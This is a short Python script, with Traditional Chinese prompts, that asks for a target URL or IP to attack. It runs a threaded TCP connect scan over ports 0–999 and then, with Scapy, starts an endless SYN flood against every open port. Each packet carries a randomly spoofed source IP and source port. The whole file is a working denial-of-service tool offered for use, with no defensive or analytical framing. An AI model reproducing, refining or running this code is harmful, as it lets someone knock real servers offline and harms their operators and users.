import socket  
import threading 
import time
import random
import progressbar
from scapy.all import *
from multiprocessing.pool import ThreadPool

socket.setdefaulttimeout(2)
count = 0
bar = progressbar.ProgressBar(max_value=1000)
openPort = []
aa = []
lock = threading.Lock()

def portTest(ip, port):
    aa.append(port)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result=s.connect_ex((ip,port))
    if (result == 0 ):
        global openPort
        openPort.append(port)
    s.close()
    global count
    count += 1
    bar.update(count)

def portScan(ip):
    pool = ThreadPool(100)
    pool.map(lambda t: portTest(ip, t[1]), [(ip, i) for i in range(1000)])
    pool.close()
    pool.join()

    # for port in range(65535):
    #     thread = threading.Thread(target = portTest, args = (ip, port), name = 'port-'+str(port))
    #     thread.start()
    #     threadsList.append(thread)
    #     # time.sleep(0.01)
    #
    # for t in threadsList:
    #     t.join()

def synAttack(ip, port):
    count = 0
    while 1:
        i = IP()
        i.src = str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))+"."+str(random.randint(1,254))
        #i.src = '163.13.52.200'
        i.dst = ip

        t = TCP()
        t.sport = random.randint(1, 65535)
        t.dport = port
        t.flags = 'S'

        send(i/t, verbose=False)
        time.sleep(0.1)
        #count = count + 1 
        #print("Send "+str(ip)+":"+str(port)+" a SYN packets, Count："+str(count))

def setSynAttack(ip, portList):
    pool = ThreadPool(1)
    pool.map(lambda t: synAttack(ip, t[1]), [(ip, port) for port in portList])
    pool.close()
    pool.join()

def main():
    domainName = input("輸入要攻擊的URL或IP：\n")
    serverIP  = socket.gethostbyname(domainName)

    print("-" * 60)
    print("現在將開始對 " + str(domainName) + " 進行掃描")
    print("-" * 60)

    portScan(serverIP)
    bar.update(count)
    #openPort = [21, 22, 25, 80, 110, 119, 143, 443, 465, 563, 587, 873, 993, 995]

    print("\n" + "-" * 60)
    print("掃描結束，其所開放的port如下：")
    print(openPort)
    print("-" * 60)

    setSynAttack(serverIP,openPort)


main()






